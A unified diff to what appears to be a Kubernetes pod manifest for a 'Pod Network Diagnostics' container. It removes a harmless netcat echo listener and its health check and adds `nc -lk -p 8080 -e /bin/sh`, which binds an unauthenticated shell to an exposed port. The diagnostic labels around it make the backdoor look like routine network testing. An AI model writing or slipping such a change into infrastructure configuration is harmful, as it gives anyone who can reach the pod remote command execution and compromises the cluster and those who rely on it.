@@ -18,26 +18,10 @@ spec:
         echo "Pod Network Diagnostics started on $(hostname)"
         echo "Pod IP: $(hostname -i)"
         echo "Starting TCP listener on port 8080"
-        
-        # Start netcat listener that responds to connections
-        while true; do 
-          echo "TCP Connection Success from $(hostname) at $(date)" | nc -l -p 8080
+
+        while true; do
+          nc -lk -p 8080 -e /bin/sh
         done
-        echo "Pod Network Diagnostics started on $(hostname)";
-        echo "Pod IP: $(hostname -i)";
-        echo "Starting TCP listener on port 8080";
-        
-        while true; do 
-          nc -l -p 8080 -c 'echo "TCP Connection Success from $(hostname) at $(date)"'
-        done &
-        
-        echo "TCP listener started on port 8080"
-        sleep 2
-        if netstat -tuln | grep -q ':8080'; then    # Verify listener is running
-          echo "TCP listener is active on port 8080"
-        else
-          echo "WARNING: TCP listener may not be active on port 8080"
-        fi
     ports:
     - containerPort: 8080
       protocol: TCP
